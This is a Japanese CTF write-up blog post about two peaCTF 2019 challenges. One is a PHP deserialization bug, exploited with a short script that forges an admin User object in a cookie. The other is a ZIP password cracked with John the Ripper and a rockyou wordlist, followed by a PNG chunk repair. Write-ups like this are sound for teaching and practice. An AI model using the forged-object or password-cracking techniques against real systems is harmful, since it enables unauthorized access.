---
layout: post
title: peaCTF Round 1 の write-up
categories: [ctf]
date: 2019-07-29 21:00:00 +0900
---

7 月 22 日から 7 月 28 日にかけて開催された [peaCTF Round 1](https://peactf.com/) に、チーム zer0pts として参加しました。最終的にチームで 5100 点を獲得し、順位は得点 540 チーム中 27 位でした。うち、私は 2 問を解いて 1400 点を入れました。

以下、私が解いた問題の writeup です。

## Web Exploitation
### Educated Guess (600)
> There is a secured system running at http://(省略)/query.php. You have obtained the source code.

以下のように `query.php` のソースコードも添付されていました。

```php
<!doctype html>
<html>
<head>
    <title>Secured System</title>
</head>
<body>
<?php

// https://www.php-fig.org/psr/psr-4/

function autoload($class)
{
    include $class . '.class.php';
}

spl_autoload_register('autoload');

if (!empty($_COOKIE['user'])) {
    $user = unserialize($_COOKIE['user']);

    if ($user->is_admin()) {
        echo file_get_contents('../flag');
    } else {
        http_response_code(403);
        echo "Permission Denied";
    }
} else {
    echo "Not logged in.";
}
?>
</body>
</html>
```

Cookie に入っている文字列を `unserialize` し、その結果生成されたオブジェクトの `is_admin` メソッドを呼んで真と評価される値が返ってくればフラグが表示されるようです。

[PHP のドキュメント](https://www.php.net/manual/ja/)で `is_admin` というメソッドを持つクラスを探してみましたが見つかりません。ビルトインのクラス以外を使う必要がありそうです。

ここでソースコードを見直してみましょう。

```php
<?php
︙
function autoload($class)
{
    include $class . '.class.php';
}

spl_autoload_register('autoload');
```

存在していないクラスのインスタンスが復元されようとした場合、`(クラス名).class.php` を自動的に読み込むようです。

適当に探してみると、`$user` という変数名から推測して `User.class.php` というファイルを見つけることができました。試しに `User` というクラスのインスタンスが復元されるような文字列を作ってみましょう。

```php
<?php
class User {}
$o = new User;
echo urlencode(serialize($o));
```

これを実行して出力された文字列を Cookie にセットし、リロードすると `Permission Denied` と表示されました。まだ何か足りないようです。

とりあえず、`admin` というそれっぽいプロパティにそれっぽい値を入れてみます。

```php
<?php
class User {}
$o = new User;
$o->admin = true;
echo urlencode(serialize($o));
```

これを実行して出力された文字列を Cookie にセットし、リロードするとフラグが表示されました。

```
flag{peactf_follow_conventions_3b2a868a8a16589704dc755276fb11fd}
```

## Forensics
### Song of My People (800)
> A specific soundcloud rapper needs help getting into his password protected zipped file directory. The initial password is in the title. You just have to know your memes, and pick the right instrument! We were on the fence on giving you an image to go along with this puzzle, but the loincloth was too scandalous. Alternatively, you could bruteforce.
> 
> 添付ファイル: song_of_my_people.zip

暗号化された ZIP ファイルが与えられました。中には `a lengthy issue.png`、`README.txt`、よくわからない mp3 ファイルの 3 つのファイルが入っているようです。

John the Ripper に投げてみましょう。

```
$ zip2john song_of_my_people.zip > song_of_my_people.john
$ john song_of_my_people.john --wordlist=/usr/share/dict/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Press 'q' or Ctrl-C to abort, almost any other key for status
︙
violin           (song_of_my_people.zip)
```

`violin` がパスワードのようです。ZIP ファイルを展開して `a lengthy issue.png` を開こうとしてみましたが、画像に問題があるようで正常に表示できません。

`pngcheck` で確認してみましょう。

```
$ pngcheck a\ lengthy\ issue.png 
a lengthy issue.png  invalid number of PLTE entries (4.04167e+08)
ERROR: a lengthy issue.png
```

`PLTE` チャンクの長さがおかしいようです。バイナリエディタで開いてみると、チャンク名の前の 4 バイトが `HELP` と明らかにおかしな内容になっていました。次の `pHYs` チャンクまでの距離などを確認して `00 00 02 68` に直すと、正常に表示できるようになりました。

画像には以下のような文章が書かれていました。

```
GREAT WORK FIXING THE CHECKSUM! This should give you the FLAG. Ex: {27_thousand_spaces_3092}

https://soundcloud.com/lil-redacted/live-concert-audio

{(how many)_thousand_spaces, or seats, were left at the most recent concert of [redacted]? + _(page number)} of the concert archive

54 68 65 20 4c 69 72 61 72 79 20 6f 66 20 42 61 62 65 6c 3a 0a 28 77 69 74 68 20 6e 65 77 20 61 64 64 69 74 69 6f 6e 20 6f 66 20 61 6c 6c 20 74 69 65 20 70 6f 73 73 69 62 6c 65 20 64 69 73 73 20 74 72 61 63 6b 73 20 74 6f 20 65 76 65 72 20 62 65 20 6d 61 64 65 20 61 6e 64 20 65 76 65 72 20 63 6f 75 6c 64 20 62 65 20 6d 61 64 65 29
```

`{???_thousand_spaces_???}` の 2 箇所の `???` を埋めればよいようです。

書かれている SoundCloud のページにアクセスすると以下のような説明がありました。

> this concert is part of a larger tour that is archived completely in some kind of hexagonal library. The archive is named between "maybe" and a "repeat". Should be on the 371st page.
> 
> I would give you an mp3 of this audio, but I don't know how to navigate those sketchy websites.

後ろの `???` は `371` でよさそうです。

前の `???` はよくわかりませんが、`1` から順番に試していくと `3` で通りました。

```
{3_thousand_spaces_371}
```